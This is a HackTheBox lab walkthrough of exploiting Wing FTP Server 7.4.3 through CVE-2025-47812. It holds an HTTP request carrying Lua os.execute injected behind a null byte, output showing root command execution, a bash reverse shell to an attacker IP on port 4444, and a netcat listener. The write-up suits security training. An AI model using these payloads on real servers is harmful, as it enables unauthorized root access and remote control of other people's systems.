# WingData — HackTheBox Lab Walkthrough

**Target:** `10.10.11.xxx`  
**Service:** Wing FTP Server v7.4.3  
**Objective:** Gain Remote Code Execution (RCE) via administrative console

---

## :warning: Vulnerability Analysis

- **CVE:** [`CVE-2025-47812`](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-47812)
- **Summary:**  
  Wing FTP Server v7.4.3 suffers from insufficient sanitization of user input passed to the Lua interpreter in its Web Administration interface. Attackers can use null-byte injection to bypass admin security filters and execute arbitrary Lua code on the host.

---

## :mag: Enumeration & Discovery

1. **Initial Service Identification**

   ```bash
   nmap -sV -p 80,443,21,22 <TARGET_IP>
   ```

   - **Result:**  
     Ports 80/443 revealed:  
     ```
     Wing FTP Server/7.4.3
     ```

2. **Port Mapping & Web Recon**

   - Navigated to the web interface and found a login page for Wing FTP Server.
   - Attempted default/common creds:

     ```bash
     admin/admin
     root/root
     ```
     _Both failed._

---

## :rotating_light: Exploitation (Burp Suite)

The exploitation targeted the login POST request parameters sent to the internal Lua engine.

### 1. Intercepting the Request

- Open Burp Suite (Intercept: ON)
- Enter dummy credentials on login page.
- Capture the POST request to:

  ```
  /admin_login.html
  ```

### 2. Crafting Payload (Lua Injection)

- Inside Burp's Repeater, modify request parameters:

  ```http
  POST /admin_login.html HTTP/1.1
  Host: wingdata.htb
  Content-Type: application/x-www-form-urlencoded

  username=admin&password=admin&command=os.execute("id")%00
  ```

  _**Note:** The `%00` null byte terminates the string, bypassing input filters checking for file extensions or specific input patterns._

### 3. Verification (RCE)

Server response includes the result of the payload:

```
uid=0(root) gid=0(root) groups=0(root)
```

**Root RCE confirmed!**

---

## :rocket: Post-Exploitation

### 1. Reverse Shell Command

Deliver a reverse shell using Lua:
```lua
os.execute("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.xx/4444 0>&1'")
```

### 2. Netcat Listener

On your attacker machine:
```bash
nc -lvnp 4444
```

---

## :no_entry_sign: Failures & Lessons Learned

- ❌ Initial shell commands failed—Wing FTP required code in a Lua `os.execute()` function.
- ❌ WAF blocked basic payloads. Success only after using null-byte injection (`%00`) to circumvent sanitization.
- :bulb: Realization that Wing FTP is Lua-based enabled tailored exploitation.

---

## Reference

- CVE: [`CVE-2025-47812`](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-47812)
- [Wing FTP Server — Official Site](https://www.wftpserver.com/)

---

<sub>HTB Lab Writeup — by PicasoTheDeal</sub>
